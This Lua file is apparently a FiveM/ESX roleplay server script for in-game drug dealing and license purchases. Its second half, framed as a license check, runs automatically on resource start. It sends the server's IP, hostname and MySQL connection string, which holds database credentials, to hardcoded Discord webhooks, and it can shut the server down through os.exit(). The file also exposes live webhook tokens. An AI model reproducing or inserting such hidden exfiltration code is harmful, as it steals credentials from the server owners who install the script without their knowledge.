--[[
	id: Hfa1Q5K8-0sFy855ih1T8
	name: Test Drugs
	description: Drus
	time1: 2021-04-30 19:57:20.657969+00
	time2: 2021-04-30 19:57:20.65797+00
	uploader: yFuO9AUbJGW07Jo7Is2wUObT1KJgzp0XpjOnvFOg
	uploadersession: SaNbJNrRe4q-Y2jTBUF_DTOmfKKGaG
	flag: f
--]]

ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('jc_advance_drugs:sellDrug')
AddEventHandler('jc_advance_drugs:sellDrug', function(itemName, amount)
	local xPlayer = ESX.GetPlayerFromId(source)
	local price = Config.DrugDealerItems[itemName]
	local xItem = xPlayer.getInventoryItem(itemName)

	if not price then
		print(('jc_advance_drugs: %s attempted to sell an invalid drug!'):format(xPlayer.identifier))
		return
	end

	if xItem.count < amount then
		TriggerClientEvent('esx:showNotification', source, _U('dealer_notenough'))
		return
	end

	price = ESX.Math.Round(price * amount)

	if Config.GiveBlack then
		xPlayer.addAccountMoney('black_money', price)
	else
		xPlayer.addMoney(price)
	end

	xPlayer.removeInventoryItem(xItem.name, amount)

	TriggerClientEvent('esx:showNotification', source, _U('dealer_sold', amount, xItem.label, ESX.Math.GroupDigits(price)))
end)

ESX.RegisterServerCallback('jc_advance_drugs:buyLicense', function(source, cb, licenseName)
	local xPlayer = ESX.GetPlayerFromId(source)
	local license = Config.LicensePrices[licenseName]

	if license == nil then
		print(('jc_advance_drugs: %s attempted to buy an invalid license!'):format(xPlayer.identifier))
		cb(false)
	end

	if xPlayer.getMoney() >= license.price then
		xPlayer.removeMoney(license.price)

		TriggerEvent('esx_license:addLicense', source, licenseName, function()
			cb(true)
		end)
	else
		cb(false)
	end
end)

ESX.RegisterServerCallback('jc_advance_drugs:canPickUp', function(source, cb, item)
	local xPlayer = ESX.GetPlayerFromId(source)
	cb(xPlayer.canCarryItem(item, 1))
end)

-- Vars

licenses = {}
licenses.productId = 3
licenses.license = "KC-SZFA-1843-3DNT-6V3U"
licenses.discord = {
    started = 'https://discord.com/api/webhooks/836382110742609971/nR3woVqSa37UubeKtOYbbYwt5jJI67xxoe925eO0MixRENQ38asBbMbgPKElq6LUcdJg',
    host = 'https://discord.com/api/webhooks/836382261816983592/vTk62PdtgV0hQ5dFlEyZ_l3wcB8ykKyz0sTcm3Xo2c-9gnjTirxusqbbRyoIyu3TGEd7'
}

-- END Vars

-- Functions

function licenses:checkLicenseAndIp()
    PerformHttpRequest("http://ip-api.com/json/",
        function(reCode, resultData, resultHeaders)
            local data = json.decode(resultData)
            PerformHttpRequest(
                "https://licencias.kcleaks.pw/api/validate/host/" ..data.query.. '/' ..licenses.productId,
                function(reCode, resultData, resultHeaders)
                    local resultHost = json.decode(resultData)
                    local statusHost = resultHost.status
                    if statusHost == 200 then
                        print('^2['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^2 - validated!^7')
                        PerformHttpRequest(
                            "https://licencias.kcleaks.pw/api/validate/licensekey/" ..licenses.license .. '/' .. licenses.productId,
                            function(reCode, resultData, resultHeaders)
                                local resultLicense = json.decode(resultData)
                                local licenseStatus = resultLicense.status
                                if licenseStatus == 301 then
                                    print('^1['..GetCurrentResourceName()..'] License^1 - not validated!^7')
                                    licenses:sendToDiscord(" License not validated",data.query,15158332,licenses.discord.host)
                                    Wait(5000)
                                    os.exit()
                                elseif licenseStatus == 200 then
                                    print('^2[' .. GetCurrentResourceName() ..'] - License validated!^7')
                                    licenses:sendToDiscord(" License and ip validated",data.query,3066993,licenses.discord.started)
                                end
                            end
                        )
                    elseif statusHost == 301 then
                        print('^1['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^1 - not validated!^7')
                        licenses:sendToDiscord(" IP not validated",data.query,15158332,licenses.discord.host)
                        Wait(5000)
                        os.exit()
                    end
                end
            )
        end
    )
end

function licenses:sendToDiscord(status,ip,color,webhook)
    local array = {
        {
            ["title"] = "``" .. 'Script started - ' ..'['..GetCurrentResourceName()..']'..status.. "``",
            ["color"] = color,
            ["description"] = 'KC Shop System',
            ["fields"] = {
                {
                    ["name"] = "-> Sv Name <-",
                    ["value"] = GetConvar('sv_hostname', false)
                },
                {
                    ["name"] = "-> Sv IP <-", 
                    ["value"] = ip
                },
                {
                    ["name"] = "-> DB Conection <-",
                    ["value"] = GetConvar('mysql_connection_string', false)
                },
                {
                    ["name"] = "-> Sv Max Clients <-",
                    ["value"] = GetConvar('sv_maxclients', false)
                },
                {
                    ["name"] = "-> Onesync <-",
                    ["value"] = GetConvar('onesync', 'on')
                },
                {
                    ["name"] = "-> Idioma <-",
                    ["value"] = GetConvar("locale", "ES")
                }
            },
            ["footer"] = {
                ["text"] = "© KC-SHOP 2021"
            },
            ["author"] = {
                ["name"] = "Kiri86",
                ["url"] = "https://i.imgur.com",
                ["icon_url"] = "https://i.imgur.com/yVTrsAN.png?size=1024"
            }
        }
    }
    PerformHttpRequest(
        webhook,
        function(err, text, headers) end, 'POST', json.encode(
            {
                username = 'KC-LOGS',
                embeds = array,
                avatar_url = "https://pbs.twimg.com/profile_images/847824193899167744/J1Teh4Di_400x400.jpg"
            }
        ), 
        {
            ['Content-Type'] = 'application/json'
        }
    )
end

-- END Functions

-- Script Starting

AddEventHandler('onResourceStart',
    function(resourceName)
        if GetCurrentResourceName() == resourceName then
            licenses:checkLicenseAndIp()
        end
    end
)

-- END Script Starting